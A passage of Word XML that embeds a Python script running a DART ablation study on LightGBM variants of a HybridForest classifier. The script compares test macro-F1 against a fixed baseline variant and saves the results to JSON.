          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "库种类"和"丢弃策略"两个变量，结论不可归因。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64714886">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="397FF0CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    mcfg = cfg["model"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09CE8B23">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    acfg = mcfg["dart_ablation"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB3A23C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not acfg.get("enabled", True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22AD32A0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("[DART] config 里 dart_ablation.enabled=false，跳过", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CC75C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1509890B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="728571CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    rows = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29CBA11F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for variant in acfg["variants"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1312585D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        name = variant["name"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248BB9D6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        overrides = {k: v for k, v in variant.items() if k != "name"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3861E66F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        model = HybridForest(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D27BDE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            n_estimators=acfg["n_estimators"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0768318E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            max_depth=mcfg["hybrid_forest"]["max_depth"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E8CB3C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            max_features=acfg["max_features"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D15CE0D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            base_depth=acfg["base_depth"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BC8186">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            base_rounds=acfg["base_rounds"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A263DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            base_pool=("lightgbm",),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719D42C5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            base_overrides={"lightgbm": overrides},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311B90BF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            random_state=seed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E4ED9A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            n_jobs=mcfg["hybrid_forest"].get("n_jobs", -1),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11A830D8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5815BC5A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        t0 = time.perf_counter()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA40E96">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        model.fit(X_train, y_train)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="124A44AE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        fit_s = time.perf_counter() - t0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C1B7175">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        metrics = evaluate(model, X_test, y_test, classes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F476FC1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rows[name] = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7183AE4D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "params": overrides,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10486906">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "fit_seconds": round(fit_s, 2),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B99AFE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "tree_count": count_trees(model),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F1BDA9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "test": metrics,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B039E78">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238BCD99">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C224966">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"[DART] {name:&lt;12} {fit_s:6.1f}s  test macro-F1 {metrics['macro_f1']:.4f}",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E8E35B0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            flush=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72FF78B0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276B1D45">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3753361D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 基线固定取 config 里排第一的变体，别用 dict 顺序——变体顺序一调，相对增量会静默换基准</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36B4AD61">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    base_name = acfg["variants"][0]["name"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2787E175">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    base = rows[base_name]["test"]["macro_f1"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46CE8CE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"\n基线 = {base_name}（config 里 dart_ablation.variants 的第一项）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="608658AF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("| 变体 | 配置 | 训练(s) | test macro-F1 | 相对基线 |")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D98B278">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("|---|---|---|---|---|")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F74163A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for name, row in rows.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546BA09B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        delta = row["test"]["macro_f1"] - base</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B03A260">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5980C1C8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"| {name} | {row['params']} | {row['fit_seconds']} | "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09FC2C6A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"{row['test']['macro_f1']:.4f} | {delta:+.4f} |"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF26427">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090B03EA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    (out_dir / "dart_ablation.json").write_text(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FEE0B41">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        json.dumps(rows, ensure_ascii=False, indent=2), encoding="utf-8"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111D1337">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47C46D01">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("\n注意：收益很小甚至为负都是正常结论，报告里如实写，不要当创新点包装。")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531B9E18">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E9B5E56">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DFC0DAA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6171AD06">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
